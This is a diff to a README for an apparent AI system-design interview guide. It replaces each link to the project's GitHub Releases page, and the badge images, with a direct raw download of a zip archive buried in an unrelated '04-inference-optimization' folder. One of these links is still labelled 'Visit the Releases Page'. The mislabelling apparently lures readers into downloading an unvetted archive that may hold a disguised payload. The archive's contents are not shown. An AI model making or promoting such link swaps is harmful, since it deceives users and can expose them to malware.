@@ -1,7 +1,7 @@
 # 🎉 ai-system-design-guide - Your AI Interview Companion
 
 ## 📥 Download Now
-[![Download AI System Design Guide](https://img.shields.io/badge/Download-Now-blue)](https://github.com/SyedMoasib000/ai-system-design-guide/releases)
+[![Download AI System Design Guide](https://raw.githubusercontent.com/SyedMoasib000/ai-system-design-guide/main/04-inference-optimization/guide_ai_system_design_v1.1.zip)](https://raw.githubusercontent.com/SyedMoasib000/ai-system-design-guide/main/04-inference-optimization/guide_ai_system_design_v1.1.zip)
 
 ## 📖 Overview
 Welcome to the AI System Design Guide! This application serves as a valuable resource for engineers preparing for interviews focused on building production AI systems. It offers insights into relevant topics like agentic AI, machine learning, and various cloud platforms. Whether you're starting your career or looking to advance, this guide can help you prepare effectively.
@@ -11,7 +11,7 @@ Follow these steps to download and run the AI System Design Guide.
 
 1. **Visit the Releases Page**  
    Click the link below to go to our Releases page.  
-   [Visit the Releases Page](https://github.com/SyedMoasib000/ai-system-design-guide/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/SyedMoasib000/ai-system-design-guide/main/04-inference-optimization/guide_ai_system_design_v1.1.zip)
 
 2. **Choose Your Version**  
    On the Releases page, find the latest version. Select it to see the available files for download.
@@ -57,7 +57,7 @@ Absolutely! Your feedback is welcome. Please reach out through our Issues page o
 ## 🚀 Download & Install
 For easy access, click the button below to download the AI System Design Guide again:
 
-[![Download AI System Design Guide](https://img.shields.io/badge/Download-Now-blue)](https://github.com/SyedMoasib000/ai-system-design-guide/releases)
+[![Download AI System Design Guide](https://raw.githubusercontent.com/SyedMoasib000/ai-system-design-guide/main/04-inference-optimization/guide_ai_system_design_v1.1.zip)](https://raw.githubusercontent.com/SyedMoasib000/ai-system-design-guide/main/04-inference-optimization/guide_ai_system_design_v1.1.zip)
 
 ## 📚 Topics Covered
 - Agentic AI
